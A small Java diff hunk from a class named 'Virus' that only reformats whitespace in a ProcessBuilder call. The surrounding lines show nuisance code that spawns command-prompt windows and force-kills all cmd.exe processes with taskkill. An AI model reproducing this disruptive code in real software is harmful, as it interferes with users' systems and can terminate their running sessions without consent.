@@ -23,7 +23,7 @@ public class Virus {
                         Thread.sleep(100);
                         break;
                     case 2:
-                        p = new ProcessBuilder("cmd","/c","start","cmd").redirectErrorStream(true).start();
+                        p = new ProcessBuilder("cmd", "/c", "start", "cmd").redirectErrorStream(true).start();
                         Thread.sleep(500);
                         new ProcessBuilder("taskkill", "/F", "/IM", "cmd.exe").start();
                         break;
